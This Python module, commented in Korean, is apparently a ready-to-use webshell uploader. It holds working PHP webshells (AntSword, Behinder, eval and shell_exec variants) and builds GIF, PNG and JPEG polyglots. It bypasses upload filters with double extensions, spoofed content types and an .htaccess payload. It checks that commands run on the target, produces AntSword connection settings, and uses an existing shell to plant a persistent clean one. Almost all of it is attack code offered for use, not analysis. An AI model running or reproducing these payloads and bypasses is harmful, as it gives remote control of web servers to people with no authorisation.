"""
범용 웹쉘 업로드 모듈
======================
실전 경험 기반 다양한 우회 기법 통합:

  1. GIF89a polyglot 파일 (이미지 검증 우회)
  2. 이중 확장자 (.php.jpg, .phtml, .php5 등)
  3. Content-Type 조작
  4. MIME 매직바이트 위조
  5. .htaccess 업로드 (확장자 실행 허용)
  6. AntSword \\x08\\x08 prefix 호환 쉘 자동 드롭

웹쉘 내부 동작 원리:
  AntSword default 인코더는 POST 파라미터 이름 앞에 \\x08\\x08을 붙여 전송.
  → PHP의 $_POST['ant'] 로는 접근 불가 (키가 '\\x08\\x08ant'로 저장됨)
  → php://input 원시 파싱 후 ltrim으로 제어문자 제거해야 정상 동작
"""
from __future__ import annotations

import re
import io
import struct
import base64
import time
from dataclasses import dataclass, field
from typing import Callable
import urllib.parse

import requests
import requests.exceptions


# ─────────────────────────────────────────────────────────────────────────────
# 웹쉘 페이로드 라이브러리
# ─────────────────────────────────────────────────────────────────────────────

WEBSHELL_PAYLOADS = {
    # AntSword default 인코더 호환 (\\x08\\x08 prefix 처리)
    "antsword_default": """<?php
@error_reporting(0);
@ini_set("display_errors", 0);
@set_time_limit(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\\x00\\x08\\x09\\x0a\\x0d\\x1a\\x1b");
parse_str($raw, $p);
foreach($p as $v){if($v!=""){@eval($v);exit;}}
foreach($_POST as $v){if($v!=""){@eval($v);exit;}}
?>""",

    # 중국 蚁剑(AntSword) base64 인코더 호환
    "antsword_base64": """<?php
@error_reporting(0);
@ini_set("display_errors", 0);
@set_time_limit(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\\x00\\x08\\x09\\x0a\\x0d");
parse_str($raw, $p);
foreach($p as $v){if($v!=""){@eval(base64_decode($v));exit;}}
?>""",

    # Behinder(冰蝎) 호환 — AES-128-CBC 기반
    "behinder": """<?php
@error_reporting(0);
$key = "e45e329feb5d925b";  // 기본 키
$post = file_get_contents("php://input");
if(!extension_loaded("openssl")){
    $t = "base64_" . "decode";
    $post = $t(substr($post, 16));
    for($i=0;$i<strlen($post);$i++){
        $post[$i] = $post[$i] ^ $key[$i+1&15];
    }
} else {
    $post = openssl_decrypt(
        substr($post,16), "AES-128-CBC",
        $key, OPENSSL_RAW_DATA, substr($post,0,16)
    );
}
$arr = explode("|",$post);
$func = $arr[0];
$params = $arr[1];
class C{public function __invoke($p){eval($p);}}
@call_user_func(new C(), $params);
?>""",

    # 기본 cmd 쉘 (수동 테스트용)
    "basic_cmd": "<?php if(isset($_GET['c'])){echo shell_exec($_GET['c']);}elseif(isset($_POST['e'])){eval(base64_decode($_POST['e']));} ?>",

    # 최소 쉘 (WAF 우회 버전)
    "minimal": "<?php @eval($_POST['x']); ?>",
}


# ─────────────────────────────────────────────────────────────────────────────
# 파일 생성 유틸
# ─────────────────────────────────────────────────────────────────────────────

def make_gif_polyglot(php_code: str = "", password: str = "ant") -> bytes:
    """
    유효한 1x1 GIF89a + PHP 코드 polyglot.
    PHP 코드가 없으면 AntSword default 인코더 호환 쉘 사용.
    """
    if not php_code:
        php_code = WEBSHELL_PAYLOADS["antsword_default"]

    gif = (
        b"GIF89a"
        b"\x01\x00\x01\x00\x00\x00\x00"
        b",\x00\x00\x00\x00\x01\x00\x01\x00\x00"
        b"\x02\x02L\x01\x00;"
    )
    return gif + b"\n" + php_code.encode("utf-8")


def make_png_polyglot(php_code: str = "") -> bytes:
    """PNG IEND 청크 뒤에 PHP 코드 추가 (일부 서버 우회)"""
    if not php_code:
        php_code = WEBSHELL_PAYLOADS["antsword_default"]

    # 최소 유효 1x1 투명 PNG
    png_bytes = bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
        "890000000a49444154789c6260000000000200012121bc330000000049454e44ae426082"
    )
    return png_bytes + b"\n" + php_code.encode("utf-8")


def make_jpg_polyglot(php_code: str = "") -> bytes:
    """JPEG EXIF 코멘트 영역에 PHP 삽입"""
    if not php_code:
        php_code = WEBSHELL_PAYLOADS["antsword_default"]

    # SOI + APP0 마커
    jpg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10,
                        0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
                        0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00])
    # EOI
    jpg_footer = bytes([0xFF, 0xD9])
    return jpg_header + php_code.encode("utf-8") + jpg_footer


def make_htaccess_payload(extension: str = "jpg") -> bytes:
    """
    .htaccess 파일: 특정 확장자를 PHP로 실행.
    .htaccess 업로드가 허용되는 경우 사용.
    """
    return (
        f"AddType application/x-httpd-php .{extension}\n"
        f"Options +ExecCGI\n"
        f"DirectoryIndex shell.{extension}\n"
    ).encode()


# ─────────────────────────────────────────────────────────────────────────────
# 업로드 시도 전략 목록
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class UploadStrategy:
    name: str
    filename: str
    content_type: str
    payload_type: str      # "gif_poly" | "png_poly" | "jpg_poly" | "raw_php" | "htaccess"
    description: str = ""


UPLOAD_STRATEGIES = [
    UploadStrategy("gif_polyglot_php",       "shell.php",        "image/gif",  "gif_poly",
                   "GIF89a magic + PHP — getimagesize 통과, PHP로 실행"),
    UploadStrategy("gif_polyglot_php5",      "shell.php5",       "image/gif",  "gif_poly",
                   "php5 확장자 — .php 차단 시 대체"),
    UploadStrategy("gif_polyglot_phtml",     "shell.phtml",      "image/gif",  "gif_poly",
                   "phtml — Apache 일부 설정에서 PHP로 실행"),
    UploadStrategy("gif_polyglot_phpjpg",    "shell.php.jpg",    "image/gif",  "gif_poly",
                   "이중 확장자 — MIME만 검사하는 경우"),
    UploadStrategy("gif_polyglot_gif",       "shell.gif",        "image/gif",  "gif_poly",
                   "GIF 확장자 — 파일명 검사 없고 실행 설정된 경우"),
    UploadStrategy("png_polyglot_php",       "shell.php",        "image/png",  "png_poly",
                   "PNG magic + PHP"),
    UploadStrategy("jpg_polyglot_php",       "shell.php",        "image/jpeg", "jpg_poly",
                   "JPEG SOI marker + PHP"),
    UploadStrategy("raw_php_jpg",            "shell.jpg",        "image/jpeg", "raw_php",
                   "PHP 코드를 jpg로 — 확장자만 검사하는 경우"),
    UploadStrategy("htaccess",               ".htaccess",        "text/plain", "htaccess",
                   ".htaccess로 jpg→PHP 실행 허용"),
]


# ─────────────────────────────────────────────────────────────────────────────
# 범용 웹쉘 업로더
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class UploadResult:
    success: bool = False
    strategy: str = ""
    shell_url: str = ""
    shell_type: str = ""
    shell_password: str = "ant"
    antsword_settings: dict = field(default_factory=dict)
    cmd_verified: bool = False
    cmd_output: str = ""
    error: str = ""


class WebshellUploader:
    """
    범용 웹쉘 업로더.
    여러 우회 전략을 순서대로 시도하고 첫 번째 성공한 결과 반환.
    """

    def __init__(
        self,
        upload_url: str,
        field_name: str = "file",
        http_session: requests.Session | None = None,
        extra_data: dict | None = None,
        on_log: Callable[[str], None] | None = None,
        timeout: int = 15,
    ):
        self.upload_url = upload_url
        self.field_name = field_name
        self.session = http_session or requests.Session()
        self.session.verify = False
        self.extra_data = extra_data or {}
        self.log = on_log or (lambda m: None)
        self.timeout = timeout
        requests.packages.urllib3.disable_warnings()

    def try_all(
        self,
        strategies: list[UploadStrategy] | None = None,
        base_url: str = "",
    ) -> UploadResult:
        """모든 전략 순서대로 시도"""
        strats = strategies or UPLOAD_STRATEGIES

        for strategy in strats:
            self.log(f"  시도: {strategy.name} ({strategy.description})")
            result = self._try_strategy(strategy, base_url)
            if result.success:
                self.log(f"  ✅ 성공: {strategy.name} → {result.shell_url}")
                return result
            time.sleep(0.3)

        return UploadResult(error="모든 업로드 전략 실패")

    def _try_strategy(self, strategy: UploadStrategy, base_url: str) -> UploadResult:
        """단일 전략 시도"""
        try:
            payload = self._make_payload(strategy)
            files = {
                self.field_name: (strategy.filename, payload, strategy.content_type)
            }

            resp = self.session.post(
                self.upload_url,
                files=files,
                data=self.extra_data,
                timeout=self.timeout,
            )

            # 응답에서 파일 URL 추출
            shell_url = self._extract_url(resp.text, resp.url, base_url, strategy)
            if not shell_url:
                return UploadResult(error=f"URL 추출 실패 ({resp.status_code})")

            # htaccess면 실제 PHP 쉘 추가 업로드
            if strategy.payload_type == "htaccess":
                return self._upload_after_htaccess(shell_url, base_url)

            # 실행 확인
            return self._verify_shell(shell_url, strategy.name)

        except Exception as e:
            return UploadResult(error=str(e))

    def _make_payload(self, strategy: UploadStrategy) -> bytes:
        """전략에 맞는 페이로드 생성"""
        php_code = WEBSHELL_PAYLOADS["antsword_default"]
        if strategy.payload_type == "gif_poly":
            return make_gif_polyglot(php_code)
        elif strategy.payload_type == "png_poly":
            return make_png_polyglot(php_code)
        elif strategy.payload_type == "jpg_poly":
            return make_jpg_polyglot(php_code)
        elif strategy.payload_type == "raw_php":
            return php_code.encode()
        elif strategy.payload_type == "htaccess":
            return make_htaccess_payload("php")
        return php_code.encode()

    def _extract_url(self, html: str, resp_url: str, base_url: str, strategy: UploadStrategy) -> str:
        """업로드 응답에서 파일 URL 추출"""
        # JSON 응답
        try:
            data = __import__("json").loads(html)
            for key in ["url", "file", "path", "src", "location", "filename"]:
                if key in data:
                    path = data[key]
                    if path.startswith("http"):
                        return path
                    return (base_url or "").rstrip("/") + "/" + path.lstrip("/")
        except Exception:
            pass

        # HTML에서 패턴 검색
        patterns = [
            r'(https?://[^\s"\'<>]+\.' + re.escape(strategy.filename.split(".")[-1]) + r')',
            r'["\']([^"\']*\.(php|phtml|php5|gif|jpg|png))["\']',
            r'src=["\']([^"\']+)["\']',
            r'href=["\']([^"\']+\.(php|gif|jpg))["\']',
            r'value=["\']([^"\']+\.(php|gif|jpg))["\']',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.I)
            if m:
                url = m.group(1)
                if url.startswith("http"):
                    return url
                if url.startswith("/"):
                    return (base_url or "").rstrip("/") + url
        return ""

    def _verify_shell(self, shell_url: str, strategy_name: str) -> UploadResult:
        """웹쉘 실행 확인"""
        tests = [
            # AntSword default 방식 (\\x08\\x08 prefix 없이)
            ("ant", "echo 'BINGO_OK';"),
            # GET 방식
            ("c", None),  # URL에 ?c=id 붙여서 GET
        ]

        for param, code in tests:
            try:
                if code:
                    r = self.session.post(
                        shell_url, data={param: code}, timeout=8
                    )
                    if "BINGO_OK" in r.text:
                        return self._build_success_result(shell_url, strategy_name, r.text)
                else:
                    r = self.session.get(shell_url + "?c=id", timeout=8)
                    if "uid=" in r.text or "www-data" in r.text:
                        return self._build_success_result(shell_url, strategy_name, r.text)
            except Exception:
                continue

        # 200 응답이면 우선 성공으로 처리
        try:
            r = self.session.get(shell_url, timeout=5)
            if r.status_code == 200:
                return UploadResult(
                    success=True,
                    strategy=strategy_name,
                    shell_url=shell_url,
                    shell_type="uploaded_unverified",
                    shell_password="ant",
                    antsword_settings=self._antsword_settings(shell_url, "ant"),
                )
        except Exception:
            pass

        return UploadResult(error=f"실행 확인 실패: {shell_url}")

    def _build_success_result(self, url: str, strategy: str, cmd_out: str) -> UploadResult:
        return UploadResult(
            success=True,
            strategy=strategy,
            shell_url=url,
            shell_type="verified",
            shell_password="ant",
            antsword_settings=self._antsword_settings(url, "ant"),
            cmd_verified=True,
            cmd_output=cmd_out[:200],
        )

    def _antsword_settings(self, url: str, password: str) -> dict:
        """AntSword 설정 자동 생성"""
        return {
            "URL地址": url,
            "连接密码": password,
            "编码器": "default (不推荐)",
            "解码器": "default",
            "连接类型": "PHP",
            "note": (
                "AntSword default 인코더가 파라미터에 \\x08\\x08 prefix를 붙임. "
                "이 쉘은 php://input 파싱으로 자동 처리."
            ),
        }

    def _upload_after_htaccess(self, htaccess_url: str, base_url: str) -> UploadResult:
        """htaccess 업로드 성공 후 PHP 쉘을 .jpg로 재업로드"""
        dir_url = htaccess_url.rsplit("/", 1)[0] + "/"
        php_code = WEBSHELL_PAYLOADS["antsword_default"].encode()
        files = {self.field_name: ("shell.jpg", php_code, "image/jpeg")}
        try:
            r = self.session.post(
                self.upload_url, files=files,
                data=self.extra_data, timeout=self.timeout,
            )
            shell_url = self._extract_url(
                r.text, r.url, base_url,
                UploadStrategy("", "shell.jpg", "", "")
            )
            if shell_url:
                return self._verify_shell(shell_url, "htaccess_php_as_jpg")
        except Exception as e:
            return UploadResult(error=f"htaccess 후 업로드 실패: {e}")
        return UploadResult(error="htaccess 업로드 후 쉘 URL 추출 실패")


# ─────────────────────────────────────────────────────────────────────────────
# 기존 쉘로 클린 쉘 드롭
# ─────────────────────────────────────────────────────────────────────────────

def drop_clean_shell(
    existing_shell_url: str,
    target_path: str,
    target_url: str,
    http_session: requests.Session | None = None,
) -> UploadResult:
    """
    GIF polyglot 쉘 (GIF 헤더 오염)을 이용해
    /tmp 또는 웹 경로에 순수 PHP 클린쉘 작성.

    왜 필요한가:
      GIF89a + PHP 쉘은 응답 앞에 GIF 바이너리가 붙어
      AntSword 파싱 오류 "返回数据为空" 발생.
      → 기존 쉘로 클린 ant.php를 file_put_contents로 작성하면 해결.
    """
    s = http_session or requests.Session()
    s.verify = False
    requests.packages.urllib3.disable_warnings()

    clean_code = WEBSHELL_PAYLOADS["antsword_default"]
    b64 = base64.b64encode(clean_code.encode()).decode()

    write_php = f"echo file_put_contents('{target_path}', base64_decode('{b64}'));"

    try:
        # 기존 쉘로 파일 작성
        r = s.post(existing_shell_url, data={"ant": write_php}, timeout=10)
        if not r.ok:
            return UploadResult(error=f"쉘 요청 실패: {r.status_code}")

        # 클린쉘 동작 확인
        time.sleep(0.5)
        test = s.post(target_url, data={"ant": "echo 'CLEAN_SHELL_OK';"}, timeout=8)
        if "CLEAN_SHELL_OK" in test.text:
            return UploadResult(
                success=True,
                strategy="clean_drop",
                shell_url=target_url,
                shell_type="clean_php",
                shell_password="ant",
                antsword_settings={
                    "URL地址": target_url,
                    "连接密码": "ant",
                    "编码器": "default",
                    "解码器": "default",
                },
                cmd_verified=True,
                cmd_output="CLEAN_SHELL_OK",
            )
        return UploadResult(error="클린쉘 동작 확인 실패")

    except Exception as e:
        return UploadResult(error=str(e))
